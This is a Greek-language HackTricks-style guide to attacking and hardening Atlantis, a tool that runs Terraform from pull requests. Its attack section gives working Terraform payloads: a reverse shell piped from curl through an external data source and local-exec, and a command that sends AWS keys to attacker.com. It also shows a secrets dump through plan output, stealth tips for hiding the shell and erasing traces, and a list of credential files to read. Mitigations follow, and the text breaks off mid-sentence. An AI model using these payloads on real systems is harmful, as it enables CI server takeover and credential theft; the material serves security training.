# Ασφάλεια Atlantis

<details>

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετέχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκερ καταθέτοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Βασικές Πληροφορίες

Το Atlantis βασικά σας βοηθάει να εκτελέσετε το terraform από τα Pull Requests από τον git server σας.

![](<../.gitbook/assets/image (161).png>)

## Τοπικό Εργαστήριο

1. Πηγαίνετε στη **σελίδα κυκλοφορίας του atlantis** στο [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) και **κατεβάστε** αυτό που σας ταιριάζει.
2. Δημιουργήστε ένα **προσωπικό τοκεν** (με πρόσβαση στο αποθετήριο) του **github** χρήστη σας
3. Εκτελέστε την εντολή `./atlantis testdrive` και θα δημιουργήσει ένα **demo αποθετήριο** που μπορείτε να χρησιμοποιήσετε για να **επικοινωνήσετε με το atlantis**
1. Μπορείτε να έχετε πρόσβαση στην ιστοσελίδα στη διεύθυνση 127.0.0.1:4141

## Πρόσβαση Atlantis

### Διαπιστευτήρια Εξυπηρετητή Git

Το **Atlantis** υποστηρίζει αρκετούς οικοδεσπότες git όπως το **Github**, το **Gitlab**, το **Bitbucket** και το **Azure DevOps**.\
Ωστόσο, προκειμένου να έχει πρόσβαση στα αποθετήρια σε αυτές τις πλατφόρμες και να εκτελέσει ενέργειες, χρειάζεται να έχει δοθεί κάποια **προνομιούχη πρόσβαση σε αυτά** (τουλάχιστον δικαιώματα εγγραφής).\
[**Τα έγγραφα**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) προτρέπουν να δημιουργήσετε ένα χρήστη σε αυτές τις πλατφόρμες ειδικά για το Atlantis, αλλά μερικοί άνθρωποι ενδέχεται να χρησιμοποιούν προσωπικούς λογαριασμούς.

{% hint style="warning" %}
Σε κάθε περίπτωση, από την οπτική γωνία ενός επιτιθέμενου, ο **λογαριασμός Atlantis** θα είναι πολύ **ενδιαφέρον** **για να διαρρεύσει**.
{% endhint %}

### Webhooks

Το Atlantis χρησιμοποιεί προαιρετικά [**Μυστικά Webhook**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) για να επικυρώσει ότι τα **webhooks** που λαμβάνει από τον Git οικοδεσπότη σας είναι **νόμιμα**.

Ένας τρόπος να επιβεβαιώσετε αυτό θα ήταν να **επιτρέψετε μόνο αιτήσεις να έρχονται από τις IP** του οικοδεσπότη Git σας, αλλά ένας ευκολότερος τρόπος είναι να χρησιμοποιήσετε ένα Μυστικό Webhook.

Σημειώστε ότι εκτός εάν χρησιμοποιείτε έναν ιδιωτικό διακομιστή github ή bitbucket, θα χρειαστεί να εκθέσετε τα σημεία τερματισμού των webhooks στο Διαδίκτυο.

{% hint style="warning" %}
Το Atlantis θα εκθέτει **webhooks** ώστε ο διακομιστής git να μπορεί να του στέλνει πληροφορίες. Από την οπτική γωνία ενός επιτιθέμενου θα ήταν ενδιαφέρον να γνωρίζετε **αν μπορείτε να του στείλετε μηνύματα**.
{% endhint %}

### Διαπιστευτήρια Παροχέα <a href="#provider-credentials" id="provider-credentials"></a>

[Από τα έγγραφα:](https://www.runatlantis.io/docs/provider-credentials.html)

Το Atlantis εκτελεί το Terraform απλά **εκτελώντας τις εντολές `terraform plan` και `apply`** στον διακομιστή **όπου φιλοξενείται το Atlantis**. Όπως όταν εκτελείτε το Terraform τοπικά, το Atlantis χρειάζεται διαπιστευτήρια για τον συγκεκριμένο πάροχό σας.

Είναι δική σας ευθύνη πώς θα [παρέχετε διαπιστευτήρια](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) για τον συγκεκριμένο πάροχό σας στο Atlantis:

* Το Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) και το [AWS Fargate Module](https://www.runatlantis.io/docs/deployment.html#aws-fargate) έχουν τους δικούς τους μηχανισμούς για τα διαπιστευτήρια του παρόχου. Διαβάστε τα έγγραφά τους.
* Εάν εκτελείτε το Atlantis σε ένα νέφος τότε πολλά νέφη έχουν τρόπους να δίνουν πρόσβαση στο API του νέφους σε εφαρμογές που τρέχουν σε αυτά, π.χ.:
* [Ρόλοι AWS EC2](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Αναζήτηση για "Ρόλος EC2")
* [Λογαριασμοί Υπηρεσιών Παράδοσης Παραδειγμάτων GCE](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Πολλοί χρήστες ορίζουν μεταβλητές περιβάλλοντος, π.χ. `AWS_ACCESS_KEY`, εκεί όπου τρέχει το Atlantis.
* Άλλοι δημιουργούν τα απαραίτητα αρχεία ρυθμίσεων, π.χ. `~/.aws/credentials`, εκεί όπου τρέχει το Atlantis.
* Χρησιμοποιήστε τον [Πάροχο HashiCorp Vault](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) για να λάβετε διαπιστευτήρια παρόχου.

{% hint style="warning" %}
Το **δοχείο** όπου **τρέχει** το **Atlantis** πιθανότατα θα περιέχει προνομιούχα διαπιστευτήρια για τους παρόχους (AWS, GCP, Github...) που το Atlantis διαχειρίζεται μέσω Terraform.
{% endhint %}

### Ιστοσελίδα

Από προεπιλογή το Atlantis θα τρέξει μια **ιστοσελίδα στη θύρα 4141 στον τοπικό υπολογιστή**. Αυτή η σελίδα απλώς σάς επιτρέπει να ενεργοποιήσετε/απενεργοποιήσετε την εφαρμογή atlantis και να ελέγξετε την κατάσταση του σχεδίου των αποθετηρίων και να τα ξεκλειδώσετε (δεν επιτρέπει τροποποιήσεις, οπότε δεν είναι τόσο χρήσιμη).

Πιθανότατα δεν θα το βρείτε εκτεθειμένο στο Διαδίκτυο, αλλά φαίνεται ότι προεπιλεγμένα **δεν απαιτούνται διαπιστευτήρια** για να έχετε πρόσβαση (και αν απαιτούνται, τα `atlantis`:`atlantis` είναι τα **προεπιλεγμένα**).

## Ρύθμιση Διακομιστή

Η ρύθμιση του `atlantis server` μπορεί να καθοριστεί μέσω σημαιών γραμμής εντολών, μεταβλητών περιβάλλοντος, ενός αρχείου ρυθμίσεων ή μιας συνδυασμένης χρήσης των τριών.

* Μπορείτε να βρείτε [**εδώ τη λίστα των σημαιών**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) που υποστηρίζονται από τον διακομιστή Atlantis
* Μπορείτε να βρείτε [**εδώ πώς να μετατρέψετε μια επιλογή ρύθμισης σε μεταβλητή περιβάλλοντος**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Οι τιμ
#### Προστασίες PR

Το Atlantis επιτρέπει να υποδείξετε αν θέλετε το **PR** να είναι **`εγκεκριμένο`** από κάποιον άλλο (ακόμα κι αν αυτό δεν έχει οριστεί στην προστασία κλαδιού) και/ή να είναι **`συγχωνεύσιμο`** (πέρασαν οι προστασίες κλαδιού) **πριν την εκτέλεση της εφαρμογής**. Από προστασίας άποψη, είναι συνιστώμενο να οριστούν και οι δύο επιλογές.

Σε περίπτωση που το `allowed_overrides` είναι True, αυτές οι ρυθμίσεις μπορούν να **αντικατασταθούν σε κάθε έργο από το αρχείο `/atlantis.yml`**.

#### Scripts

Η διαμόρφωση του αποθετηρίου μπορεί να **καθορίσει scripts** που θα εκτελεστούν [**πριν**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) και [**μετά**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) από την εκτέλεση μιας **ροής εργασιών**.

Δεν υπάρχει καμία επιλογή για να επιτρέπετε τη **καθορισμό** αυτών των scripts στο **αποθετήριο `/atlantis.yml`**.

#### Ροή Εργασιών

Στη διαμόρφωση του αποθετηρίου (διαμόρφωση στην πλευρά του διακομιστή) μπορείτε να [**καθορίσετε μια νέα προεπιλεγμένη ροή εργασιών**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), ή [**δημιουργήσετε νέες προσαρμοσμένες ροές εργασιών**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Μπορείτε επίσης να **καθορίσετε** ποια **αποθετήρια** μπορούν να **έχουν πρόσβαση** στις **νέες** που δημιουργήθηκαν.\
Στη συνέχεια, μπορείτε να επιτρέψετε στο αρχείο **atlantis.yaml** κάθε αποθετηρίου να **καθορίσει τη ροή εργασιών που θα χρησιμοποιηθεί.**

{% hint style="danger" %}
Αν η σημαία [**διαμόρφωσης στην πλευρά του διακομιστή**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` είναι ορισμένη σε **True**, οι ροές εργασιών μπορούν να **καθοριστούν** στο αρχείο **`atlantis.yaml`** κάθε αποθετηρίου. Είναι επίσης πιθανόν να απαιτείται ότι το **`allowed_overrides`** καθορίζει επίσης το **`workflow`** για να **αντικαταστήσει τη ροή εργασιών** που θα χρησιμοποιηθεί.\
Αυτό ουσιαστικά θα δώσει **RCE στο διακομιστή Atlantis σε οποιονδήποτε χρήστη μπορεί να έχει πρόσβαση σε αυτό το αποθετήριο**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Έλεγχος Πολιτικής Conftest

Το Atlantis υποστηρίζει την εκτέλεση **server-side** [**conftest**](https://www.conftest.dev/) **πολιτικών** εναντίον της εξόδου του σχεδίου. Συνήθη περιπτώσεις χρήσης για τη χρήση αυτού του βήματος περιλαμβάνουν:

* Απαγόρευση χρήσης μιας λίστας ενοτήτων
* Επιβεβαίωση των χαρακτηριστικών ενός πόρου κατά τη δημιουργία
* Ανίχνευση αθέλητων διαγραφϿν πόρων
* Πρόληψη κινδύνων ασφαλείας (π.χ. αποκάλυψη ασφαλών θυρών στο κοινό)

Μπορείτε να ελέγξετε πώς να το ρυθμίσετε στα [**έγγραφα**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

## Εντολές Atlantis

Στα [**έγγραφα**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) μπορείτε να βρείτε τις επιλογές που μπορείτε να χρησιμοποιήσετε για την εκτέλεση του Atlantis:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Επιθέσεις

{% hint style="warning" %}
Αν κατά την εκμετάλλευση εντοπίσετε αυτό το **σφάλμα**: `Error: Error acquiring the state lock`

Μπορείτε να το διορθώσετε εκτελώντας:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Σχέδιο RCE του Atlantis - Τροποποίηση ρυθμίσεων σε νέα PR

Εάν έχετε πρόσβαση εγγραφής σε ένα αποθετήριο, θα μπορείτε να δημιουργήσετε ένα νέο κλαδί σε αυτό και να δημιουργήσετε ένα PR. Εάν μπορείτε **να εκτελέσετε `atlantis plan`** (ή ίσως εκτελείται αυτόματα) **θα μπορείτε να εκτελέσετε RCE μέσα στον διακομιστή Atlantis**.

Μπορείτε να το κάνετε αυτό κάνοντας [**το Atlantis να φορτώσει μια εξωτερική πηγή δεδομένων**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Απλά τοποθετήστε ένα φορτίο όπως το παρακάτω στο αρχείο `main.tf`:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Αόρατη Επίθεση

Μπορείτε να εκτελέσετε αυτήν την επίθεση ακόμα και με έναν **αόρατο τρόπο**, ακολουθώντας αυτές τις προτάσεις:

* Αντί να προσθέσετε το rev shell απευθείας στο αρχείο terraform, μπορείτε να **φορτώσετε ένα εξωτερικό πόρο** που περιέχει το rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Μπορείτε να βρείτε τον κώδικα του αντίστροφου κελύφους στο [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* Στο εξωτερικό πόρο, χρησιμοποιήστε το χαρακτηριστικό **ref** για να κρύψετε τον **κώδικα αντίστροφου κελύφους terraform σε ένα κλαδί** μέσα στο αποθετήριο, κάτι τέτοιο: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Αντί** να δημιουργήσετε ένα **PR στο master** για να ενεργοποιήσετε το Atlantis, **δημιουργήστε 2 κλαδιά** (test1 και test2) και δημιουργήστε ένα **PR από το ένα στο άλλο**. Όταν ολοκληρώσετε την επίθεση, απλά **αφαιρέστε το PR και τα κλαδιά**.

### Atlantis plan Secrets Dump

Μπορείτε να **απορροφήσετε τα μυστικά που χρησιμοποιούνται από το terraform** εκτελώντας την εντολή `atlantis plan` (`terraform plan`) τοποθετώντας κάτι τέτοιο στο αρχείο terraform:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Εφαρμογή Atlantis RCE - Τροποποίηση ρυθμίσεων σε νέα PR

Εάν έχετε δικαιώματα εγγραφής σε ένα αποθετήριο, θα μπορείτε να δημιουργήσετε ένα νέο κλαδί σε αυτό και να δημιουργήσετε ένα PR. Εάν μπορείτε **να εκτελέσετε `atlantis apply` θα μπορείτε να εκτελέσετε RCE μέσα στον διακομιστή Atlantis**.

Ωστόσο, συνήθως θα χρειαστεί να παρακάμψετε μερικές προστασίες:

* **Δυνατότητα συγχώνευσης**: Εάν αυτή η προστασία είναι ενεργοποιημένη στο Atlantis, μπορείτε να εκτελέσετε **`atlantis apply` μόνο εάν το PR είναι συγχωνεύσιμο** (πράγμα που σημαίνει ότι πρέπει να παρακαμφθεί η προστασία κλαδιού).
* Ελέγξτε πιθανές [**παρακάμψεις προστασίας κλαδιού**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
* **Εγκεκριμένο**: Εάν αυτή η προστασία είναι ενεργοποιημένη στο Atlantis, κάποιος **άλλος χρήστης πρέπει να εγκρίνει το PR** πριν μπορέσετε να εκτελέσετε `atlantis apply`
* Από προεπιλογή μπορείτε να καταχραστείτε το [**διακριτικό Gitbot για να παρακάμψετε αυτήν την προστασία**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Εκτέλεση **`terraform apply` σε ένα κακόβουλο αρχείο Terraform με** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Απλά πρέπει να βεβαιωθείτε ότι κάποιο φορτίο όπως τα παρακάτω τελειώνει στο αρχείο `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Ακολουθήστε τις **προτάσεις από την προηγούμενη τεχνική** για να εκτελέσετε αυτήν την επίθεση με έναν **πιο αθόρυβο τρόπο**.

### Εισαγωγή Παραμέτρων Terraform

Κατά την εκτέλεση της εντολής `atlantis plan` ή `atlantis apply`, το terraform εκτελείται υπό-ανάγκες, μπορείτε να περάσετε εντολές στο terraform από το atlantis σχολιάζοντας κάτι σαν:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Κάτι που μπορείτε να περάσετε είναι μεταβλητές περιβάλλοντος που μπορεί να βοηθήσουν στην παράκαμψη ορισμένων προστασιών. Ελέγξτε τις μεταβλητές περιβάλλοντος του Terraform στη διεύθυνση [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Προσαρμοσμένη Ροή Εργασίας

Εκτέλεση **κακόβουλων προσαρμοσμένων εντολών κατασκευής** που καθορίζονται σε ένα αρχείο `atlantis.yaml`. Το Atlantis χρησιμοποιεί το αρχείο `atlantis.yaml` από το κλαδί του αιτήματος ενσωμάτωσης, **όχι** από το `master`.\
Αυτή η δυνατότητα αναφέρθηκε σε προηγούμενη ενότητα:

{% hint style="danger" %}
Εάν η σημαία [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` έχει τεθεί σε **True**, οι ροές εργασίας μπορούν να καθοριστούν στο αρχείο **`atlantis.yaml`** κάθε αποθετηρίου. Είναι επίσης πιθανόν να χρειάζεται η **`allowed_overrides`** να καθορίζει επίσης το **`workflow`** για να **αντικαταστήσει τη ροή εργασίας** που θα χρησιμοποιηθεί.

Αυτό ουσιαστικά θα δώσει **RCE στον διακομιστή Atlantis σε οποιονδήποτε χρήστη μπορεί να έχει πρόσβαση σε αυτό το αποθετήριο**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Παράκαμψη προστασιών σχεδιασμού/εφαρμογής

Αν η σημαία [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _έχει_ ρυθμιστεί με `apply_requirements`, είναι δυνατό για ένα αποθετήριο να **τροποποιήσει τις προστασίες σχεδιασμού/εφαρμογής για να τις παρακάμψει**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### Απαγωγή PR

Εάν κάποιος στείλει σχόλια **`atlantis plan/apply` στα έγκυρα αιτήματα συγχώνευσής σας,** θα προκαλέσει την εκτέλεση του terraform όταν δεν το επιθυμείτε.

Επιπλέον, αν δεν έχετε ρυθμίσει στη **προστασία κλαδιού** να ζητά να **επαναξιολογεί** κάθε PR όταν γίνεται **νέα υποβολή ενημερώσεων** σε αυτό, κάποιος θα μπορούσε να **γράψει κακόβουλες διαμορφώσεις** (ελέγξτε προηγούμενα σενάρια) στη διαμόρφωση του terraform, να εκτελέσει `atlantis plan/apply` και να κερδίσει RCE.

Αυτή είναι η **ρύθμιση** στις προστασίες κλαδιού του Github:

![](<../.gitbook/assets/image (216).png>)

### Μυστικό Webhook

Αν καταφέρετε να **κλέψετε το μυστικό webhook** που χρησιμοποιείται ή αν **δεν χρησιμοποιείται κανένα μυστικό webhook**, θα μπορούσατε να **καλέσετε το webhook του Atlantis** και να **εκτελέσετε εντολές atlantis** απευθείας.

### Bitbucket

Το Bitbucket Cloud **δεν υποστηρίζει μυστικά webhook**. Αυτό θα μπορούσε να επιτρέψει σε επιτιθέμενους να **πλασάρουν αιτήματα από το Bitbucket**. Βεβαιωθείτε ότι επιτρέπετε μόνο τις διευθύνσεις IP του Bitbucket.

* Αυτό σημαίνει ότι ένας **επιτιθέμενος** θα μπορούσε να κάνει **ψεύτικα αιτήματα στο Atlantis** που φαίνεται ότι προέρχονται από το Bitbucket.
* Εάν καθορίζετε `--repo-allowlist` τότε θα μπορούσαν μόνο να πλασάρουν ψεύτικα αιτήματα που αφορούν αυτά τα αποθετήρια, έτσι η μεγαλύτερη ζημιά που θα μπορούσαν να προκαλέσουν θα ήταν να προγραμματίσουν/εφαρμόσουν στα δικά σας αποθετήρια.
* Για να το αποτρέψετε, επιτρέψτε [τις διευθύνσεις IP του Bitbucket](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (δείτε τις εξερχόμενες διευθύνσεις IPv4).

## Μετά την Εκμετάλλευση

Αν καταφέρετε να αποκτήσετε πρόσβαση στον διακομιστή ή τουλάχιστον να έχετε ένα LFI, υπάρχουν μερικά ενδιαφέροντα πράγματα που πρέπει να δοκιμάσετε να διαβάσετε:

* `/home/atlantis/.git-credentials` Περιέχει διαπιστευτήρια πρόσβασης στο vcs
* `/atlantis-data/atlantis.db` Περιέχει διαπιστευτήρια πρόσβασης στο vcs με περισσότερες πληροφορίες
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Αρχείο κατάστασης terraform
* Παράδειγμα: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Μεταβλητές περιβάλλοντος
* `/proc/[2-20]/cmdline` Εντολή γραμμής του `atlantis server` (μπορεί να περιέχει ευαίσθητα δεδομένα)

## Αντιμετωπίσεις

### Μην Χρησιμοποιείτε Σε Δημόσια Αποθετήρια <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Επειδή οποιοσδήποτε μπορεί να σχολιάσει σε δημόσια αιτήματα συγχώνευσης, ακόμα και με όλες τις διαθέσιμες αντιμετωπίσεις ασφαλείας, είναι επικίνδυνο να εκτελείτε το Atlantis σε δημόσια αποθετήρια χωρίς τη σωστή ρύθμιση των ρυθμίσεων ασφαλείας.

### Να Μην Χρησιμοποιείτε `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Αν εκτελείτε σε ένα δημόσιο αποθετήριο (το οποίο δεν συνιστάται, δείτε παραπάνω) δεν πρέπει να ορίζετε `--allow-fork-prs` (προεπιλογή σε false) επειδή οποιοσδήποτε μπορεί να ανοίξει ένα αίτημα συγχώνευσης από το δικό του αντίγραφο στο αποθετήριό σας.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Το Atlantis απαιτεί να καθορίσετε μια λίστα επιτρεπόμενων αποθετηρίων από τα οποία θα δέχεται webhooks μέσω της σημαίας `--repo-allowlist`. Για παράδειγμα:

* Συγκεκριμένα αποθετήρια: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Ολόκληρος ο οργανισμός σας: `--repo-allowlist=github.com/runatlantis/*`
* Κάθε αποθετήριο στην εγκατάσταση σας του GitHub Enterprise: `--repo-allowlist=github.yourcompany.com/*`
* Όλα τα αποθετήρια: `--repo-allowlist=*`. Χρήσιμο για όταν βρίσκεστε σε προστατευμένο δίκτυο αλλά επικίνδυνο χωρίς να ορίσετε επίσης ένα μυστικό webhook.

Αυτή η σημαία εξασφαλίζει ότι η εγκατάστασή σας Atlantis δεν χρησιμοποιείται με αποθετήρια που δεν ελέγχετε. Δείτε `atlantis server --help` για περισσότερες λεπτομέρειες.

### Προστασία Σχεδιασμού Terraform <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Αν οι επιτιθέμενοι υποβάλλουν αιτήματα συγχώνευσης με κακόβουλο κώδικα Terraform είναι στο μοντέλο απειλών σας, πρέπει να γνωρίζετε ότι οι εγκρίσεις `terraform apply` δεν είναι αρκετές. Είναι δυνατόν να εκτελεστεί κακόβουλος κώδικας σε ένα `terraform plan` χρησιμοποιώντας τον [εξωτερικό προμηθευτή δεδομένων](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) ή καθορίζοντας ένα κακόβουλο πάροχο. Αυτός ο κώδικας θα μπορούσε να αποστείλει τα διαπιστευτήριά σας.

Για να το αποτρέψετε, θα μπορούσατε:

1. Να ενσωματώσετε τους παρόχους στην εικόνα ή τον κόμβο του Atlantis και να αρνηθείτε την έξοδο στην παραγωγή.
2. Να εφαρμόσετε το πρωτόκολλο καταχώρησης παρόχων εσωτερικά και να αρνηθείτε τη δημόσια έξοδο, έτσι ελέγχετε ποιος έχει δικαίωμα εγγραφής στον κατάλογο.
3. Να τροποποιήσετε τη [διαμόρφωση αποθετηρίου στην πλευρά του διακομιστή](https://www.runatlantis.io/docs/server-side-repo-config.html) σας για να επικυρώνετε κατά την εκτέλεση του βήματος `plan` τη χρήση απαγορευμένων παρόχων ή πηγών δεδομένων ή PR από μη επιτρεπόμενους χρήστες. Μπορείτε επίσης να προσθέσετε επιπλέον επικύρωση σε αυτό το σημείο, π.χ. απαιτώντας ένα "θετικό σημάδι" στο PR πριν επιτραπεί η συνέχεια του `plan`. Το Conftest θα μπορούσε να είναι χρήσιμο εδώ.

### Μυστικά Webhook <a href="#webhook-secrets" id="webhook-secrets"></a>

Το Atlantis πρέπει να εκτελείται με τα μυστικά webhook που έχουν οριστεί μέσω των μεταβλητών περιβάλλοντος `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. Ακόμα και με τη σημαία `--repo-allowlist` ορισμένη, χωρίς ένα μυστικό webhook, οι επιτιθέμενοι θα μπορούσαν να κάνουν αιτήματα στο Atlantis παριστάνοντας ένα αποθετήριο που είναι στη λίστα επιτρ
